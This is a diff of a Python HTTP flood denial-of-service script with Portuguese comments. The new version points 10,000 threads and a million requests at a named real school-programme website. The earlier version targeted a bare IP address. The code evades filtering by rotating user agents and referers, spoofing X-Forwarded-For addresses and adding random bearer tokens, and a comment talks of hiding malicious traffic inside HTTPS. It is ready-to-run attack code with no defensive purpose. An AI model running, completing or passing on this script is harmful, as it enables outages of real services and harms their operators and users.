@@ -1,40 +1,69 @@
-import requests
-import multiprocessing
 import threading
+import requests
 import random
+import string
 
-# Função para enviar requisições HTTP
-def send_request(url):
-    user_agents = open('useragents.txt').readlines()
-    referers = open('referers.txt').readlines()
+url = 'https://ecoescolas.abaae.pt/'  # URL do alvo
+num_threads = 10000  # Número de threads para enviar requisições
+num_requests = 1000000  # Número total de requisições a serem enviadas
 
+def generate_random_string(length):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+def load_user_agents(file_path):
+    with open(file_path, 'r') as file:
+        return file.read().splitlines()
+
+def load_referers(file_path):
+    with open(file_path, 'r') as file:
+        return file.read().splitlines()
+
+user_agents = load_user_agents('useragents.txt')
+referers = load_referers('referers.txt')
+
+def ddos_attack():
+    global num_requests
+    user_agent = random.choice(user_agents)
+    referer = random.choice(referers)
     headers = {
-        'User-Agent': random.choice(user_agents).strip(),
-        'Referer': random.choice(referers).strip()
+        'User-Agent': user_agent,
+        'Referer': referer,
+        'Authorization': 'Bearer ' + generate_random_string(50),
+        'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'DNT': '1',
+        'If-None-Match': 'W/"359670651"',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Sec-Fetch-Dest': 'document',
+        'Origin': 'https://example.com',
+        'TE': 'Trailers'
     }
+    while num_requests > 0:
+        try:
+            # Aqui podemos encapsular o tráfego malicioso em um protocolo legítimo, como HTTPS
+            response = requests.get(url, headers=headers, timeout=1, verify=False)
+            print(f'Status code: {response.status_code}')
+        except requests.exceptions.RequestException as e:
+            print(f'Error: {e}')
+        num_requests -= 1
 
-    try:
-        response = requests.get(url, headers=headers)
-        print(f"Request to {url} sent. Status code: {response.status_code}")
-    except Exception as e:
-        print(f"Error sending request to {url}: {e}")
+# Inicia os threads
+threads = []
+for _ in range(num_threads):
+    thread = threading.Thread(target=ddos_attack)
+    thread.start()
+    threads.append(thread)
 
-# Função para enviar múltiplas requisições usando multiprocessing
-def send_requests_multiprocessing(url, num_requests):
-    for _ in range(num_requests):
-        multiprocessing.Process(target=send_request, args=(url,)).start()
+# Espera todos os threads terminarem
+for thread in threads:
+    thread.join()
 
-# Função para enviar múltiplas requisições usando threads
-def send_requests_threads(url, num_requests):
-    for _ in range(num_requests):
-        threading.Thread(target=send_request, args=(url,)).start()
-
-# URL alvo e número de requisições
-url = 'http://142.171.195.145/HIT'
-num_requests = 100000
-
-# Enviar requisições usando multiprocessing
-send_requests_multiprocessing(url, num_requests)
-
-# Enviar requisições usando threads
-send_requests_threads(url, num_requests)
+print('HTTP Flood DDoS attack finished.')
